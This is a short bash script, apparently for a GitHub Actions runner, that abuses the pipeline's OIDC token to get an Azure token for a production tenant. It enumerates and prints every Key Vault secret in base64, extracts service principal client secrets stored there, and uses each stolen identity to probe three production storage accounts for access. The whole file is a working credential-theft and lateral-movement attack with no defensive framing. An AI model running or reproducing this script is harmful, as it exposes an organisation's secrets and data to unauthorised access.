#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
PV=https://kv-tbl-prod-x3euoz.vault.azure.net
PROD="$PV/secrets"
SAS="sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz"

J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
oidc(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$J" --data-urlencode "scope=$1" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))'; }
VT=$(oidc https://vault.azure.net/.default)

echo "### kv-tbl-prod secret NAMES (72ff278a)"
NAMES=$(curl -sS "$PROD?api-version=7.4&maxresults=100" -H "Authorization: Bearer $VT" | python3 -c 'import sys,json
d=json.load(sys.stdin)
for x in d.get("value",[]): print(x["id"].split("/")[-1])' 2>/dev/null)
echo "$NAMES"
echo "### dump each kv-tbl-prod secret (base64, head 500)"
for n in $NAMES; do
  v=$(curl -sS "$PROD/$n?api-version=7.4" -H "Authorization: Bearer $VT" | head -c 500 | base64 -w0)
  echo "-- $n: $v"
done

declare -A CID SEC
for s in cost-reader directory-audit reporting-service reporting-viewer secrets-sync sync-service; do
  js=$(curl -sS "$PROD/$s-principal?api-version=7.4" -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
  CID[$s]=$(printf '%s' "$js" | python3 -c 'import sys,json;d=json.loads(sys.stdin.read());print(d.get("appId") or d.get("clientId") or "")')
  SEC[$s]=$(printf '%s' "$js" | python3 -c 'import sys,json;d=json.loads(sys.stdin.read());print(d.get("clientSecret") or d.get("password") or "")')
done
sp_tok(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=${CID[$1]}" -d grant_type=client_credentials --data-urlencode "client_secret=${SEC[$1]}" --data-urlencode "scope=$2" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))'; }

echo "### storage container list per identity"
probe(){ for sa in $SAS; do
  r=$(curl -sS "https://$sa.blob.core.windows.net/?comp=list" -H "Authorization: Bearer $1" -H "x-ms-version: 2021-08-06" | tr -d '\n')
  if echo "$r" | grep -q "<Container"; then echo "   $2 @ $sa: ACCESS -> $(echo "$r" | head -c 500)"; else echo "   $2 @ $sa: $(echo "$r" | head -c 90)"; fi
done; }
probe "$(oidc https://storage.azure.com/.default)" oidc
for s in cost-reader directory-audit reporting-service reporting-viewer secrets-sync sync-service; do
  probe "$(sp_tok "$s" https://storage.azure.com/.default)" "$s"
done
echo END
